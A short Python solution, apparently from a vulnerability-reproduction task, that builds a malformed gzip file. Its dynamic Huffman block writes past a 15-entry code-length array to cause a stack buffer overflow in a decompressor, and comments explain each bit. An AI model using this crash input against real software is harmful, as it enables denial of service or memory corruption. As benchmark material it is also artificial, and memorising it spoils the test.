import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # GZIP Header (10 bytes)
        # Magic (1f 8b), CM (08 = Deflate), Flags (00), MTime (00 00 00 00), XFL (00), OS (00)
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'
        
        # Deflate Payload (Trigger for Stack Buffer Overflow)
        # The vulnerability is in the Huffman decoding of dynamic blocks.
        # Temporary arrays for code lengths are sized to 15, but the code length alphabet 
        # includes symbols 16, 17, 18.
        # The code length permutation order starts: 16, 17, 18, 0, ...
        # We create a Dynamic Huffman block (BTYPE=2) that triggers a write to index 16.
        
        # Bitstream breakdown:
        # Byte 0:
        #   Bit 0: 1 (BFINAL=1)
        #   Bit 1-2: 10 (BTYPE=2, LSB first: 0, 1)
        #   Bit 3-7: 00000 (HLIT=0 -> 257 codes)
        #   Value: 00000101 = 0x05
        
        # Byte 1:
        #   Bit 0-4: 00000 (HDIST=0 -> 1 code)
        #   Bit 5-7: 000 (HCLEN lower 3 bits)
        #   Value: 0x00
        
        # Byte 2:
        #   Bit 0: 0 (HCLEN 4th bit -> HCLEN=0 -> 4 code lengths: 16, 17, 18, 0)
        #   Bit 1-3: 000 (Code length for symbol 16). 
        #             This triggers writing 0 to lengths[16], overflowing the 15-byte buffer.
        #   Bit 4-7: 0000 (Padding)
        #   Value: 0x00
        
        payload = b'\x05\x00\x00'
        
        # Footer (8 bytes)
        # CRC32 (4 bytes) + ISIZE (4 bytes). Zeros are sufficient as crash happens during decompression.
        footer = b'\x00' * 8
        
        return header + payload + footer